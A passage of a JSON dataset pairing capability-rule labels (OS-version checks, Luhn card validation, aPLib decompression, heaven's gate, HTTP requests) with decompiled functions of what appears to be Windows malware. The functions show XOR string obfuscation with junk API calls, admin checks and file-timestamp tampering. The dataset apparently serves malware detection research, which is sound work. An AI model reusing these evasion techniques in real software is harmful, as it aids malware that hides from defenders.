= (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                if (iVar5 != 0x861c95) {\n                    var_8h = 6;\n                    *(iVar6 + piVar4) = *(&var_10h + iVar6 % 6) ^ (iVar6 + piVar4)[&var_24h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_4ch = 0x5a09621f;\n            var_48h = 0x66164c15;\n            var_44h = 0x622d732d;\n            var_40h = 0x4c165a14;\n            var_3ch = 0x731b663e;\n            var_38h = 0x5a16623c;\n            var_34h = 0x66034c37;\n            var_30h = 0x622d732e;\n            var_2ch = 0x4c1c5a2a;\n            var_28h = 0x735a6615;\n            var_10h = 0x5a66624c;\n            var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x73);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                if (iVar5 != 0x8cff5c) {\n                    var_8h = 5;\n                    *(iVar6 + piVar4) = *(&var_10h + iVar6 % 5) ^ (iVar6 + piVar4)[&var_4ch - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1118
    },
    "004057d7": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004057d7(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.00401abf(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.0040d3e1();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 400
    },
    "00409d70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409d70(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_1fh;\n    uchar var_1bh;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uchar var_10h;\n    uchar var_fh;\n    int32_t cbSid;\n    int32_t nSize;\n    uint32_t var_4h;\n    \n    *0x41db68 = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41db5c = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41db58 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.00408114();\n    fcn.00409d07();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41db84 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    cbSid = 5;\n    if (*0x41db84 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41db84, &nSize);\n        if (iVar4 == 0) {\n            var_28h = 0x630a4d1d;\n            var_24h._0_1_ = 5;\n            stack0xffffffd9 = 0x2c440348;\n            var_1fh = 0x444d1f4e;\n            var_1bh = 99;\n            pIdentifierAuthority = 0x63444d48;\n            var_10h = 0x4e;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                if (iVar5 != 0xf7d5b1) {\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % cbSid) ^ (iVar6 + iVar4)[&var_28h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41db84, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.00409993();\n    }\n    var_fh = 5;\n    pIdentifierAuthority = 0;\n    var_10h = 0;\n    var_4h = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                       (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (var_4h != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &var_4h);\n        var_4h = var_4h & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (var_4h != 0) {\n            if (*0x41db5c < 6) {\n                return 0;\n            }\n            fcn.00409fee();\n            goto code_r0x00409f05;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x00409f05:\n    if (5 < *0x41db5c) {\n        fcn.00409f1e();\n    }\n    return 0;\n}\n",
        "token_count": 1027
    },
    "004040e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004040e0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    stack0xffffffd5 = CONCAT13(0x37, var_28h._1_3_);\n    stack0xffffffd9 = 0x4930040e;\n    var_20h._1_1_ = 0x3f;\n    var_20h._2_2_ = 0x4059;\n    var_1ch._0_1_ = 0x51;\n    var_18h = 0x51726a56;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x39);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_ch = 5;\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar3 != 0xac8a23) {\n            *(iVar6 + iVar2) = *(&var_18h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_24h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41dab0 == NULL) {\n        var_8h = 6;\n        var_28h._0_1_ = 6;\n        var_2ch = 0x4071263;\n        stack0xffffffd5 = 0x1a1e7655;\n        stack0xffffffd9 = 0x5f511713;\n        var_20h._1_1_ = 5;\n        var_20h._2_2_ = 0x4344;\n        var_1ch._0_1_ = 0x55;\n        var_1ch._1_1_ = 0x38;\n        var_18h = 0x70746b30;\n        var_14h._0_2_ = 0x3863;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_ch = &var_2ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 0xb338a7) {\n                *(iVar3 + iVar6) = *(&var_18h + iVar3 % var_8h) ^ (iVar3 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41dab0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41dab0)(&var_4h, 4);\n    if (var_4h < 0) {\n        var_4h = -var_4h;\n    }\n    iVar6 = var_4h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 994
    },
    "00409d07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409d07(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41db4c = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "0040931b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040931b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.004091d8(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.004087a4(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.00406f1f(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 579
    },
    "004044bb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004044bb(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.00404449();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x0040455d;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x0040455d;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040455d:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 605
    },
    "0040459f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040459f(uint lpLastWriteTime)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    ushort var_2bh;\n    uchar var_29h;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    uint var_8h;\n    \n    iVar3 = *0x41dab8;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    var_8h = 0x1b;\n    uVar7 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar7 % 0x1b + 1;\n    var_22h._2_2_ = uVar6 % 0x16 + 1;\n    uVar7 = uVar6 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar7 % 0x3b + 1;\n    var_1ch = uVar6 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar6 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x751e4b4c;\n    var_58h = 0x6925691f;\n    var_54h = 0x4b007611;\n    var_50h._0_1_ = var_8h;\n    stack0xffffffad = 0x17695375;\n    var_4bh = 0x10760669;\n    var_47h = 0x2751a4b;\n    var_43h = 0x18692e69;\n    var_3fh = 0x5b4b5a76;\n    var_3bh = 0x28692a75;\n    var_37h = 0xd761869;\n    var_33h = 0x1375474b;\n    var_2fh = 0x10693369;\n    var_2bh = 0x6976;\n    var_29h = 0x4b;\n    var_18h = 0x75694b69;\n    var_14h._0_1_ = 0x76;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0x8c0a76) {\n            var_8h = 5;\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_5ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.00404449();\n    if (iVar8 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 1364
    },
    "004047cf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004047cf(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.00404449();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.0040459f(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 427
    },
    "00405119": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405119(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41dab4 = 1;\n    fcn.00406492(param_1);\n    fcn.0040acec();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41db48);\n    if (iVar1 != -1) {\n        fcn.00404b69();\n    }\n    fcn.00404c9d();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.00404baa();\n    return;\n}\n",
        "token_count": 138
    },
    "00409c90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409c90(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00409bc8();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 287
    },
    "0040a0de": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a0de(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar11 = param_1 - *(param_1[0xf] + 0x34 + param_1);\n    iVar3 = *(param_1[0xf] + 0xa0 + param_1);\n    if (iVar3 == 0) {\ncode_r0x0040a191:\n        uVar8 = 0;\n    }\n    else {\n        piVar10 = iVar3 + param_1;\n        if (piVar10 != param_1) {\n            while( true ) {\n                iVar3 = piVar10[1];\n                if (iVar3 == 0) break;\n                iVar4 = *piVar10;\n                piVar5 = piVar10 + 2;\n                uVar7 = iVar3 - 8U >> 1;\n                while (uVar7 != 0) {\n                    uVar7 = uVar7 - 1;\n                    uVar9 = *piVar5;\n                    uVar6 = *piVar5 >> 0xc;\n                    if (uVar6 != 0) {\n                        if (uVar6 == 1) {\n                            piVar2 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar2 = *piVar2 + (iVar11 >> 0x10);\n                        }\n                        else if (uVar6 == 2) {\n                            piVar2 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar2 = *piVar2 + iVar11;\n                        }\n                        else {\n                            if ((uVar6 != 3) && (uVar6 != 10)) goto code_r0x0040a191;\n                            piVar1 = param_1 + (uVar9 & 0xfff) + iVar4;\n                            *piVar1 = *piVar1 + iVar11;\n                        }\n                    }\n                    piVar5 = piVar5 + 2;\n                }\n                piVar10 = piVar10 + piVar10[1];\n            }\n        }\n        uVar8 = 1;\n    }\n    return uVar8;\n}\n",
        "token_count": 580
    },
    "0040fc70": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040fc70(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040fcc5(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 185
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401000(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    // [00] -r-x section size 61440 named .text\n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 561
    },
    "00401e4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "send HTTP request",
            "create HTTP request",
            "connect to HTTP server",
            "send data"
        ],
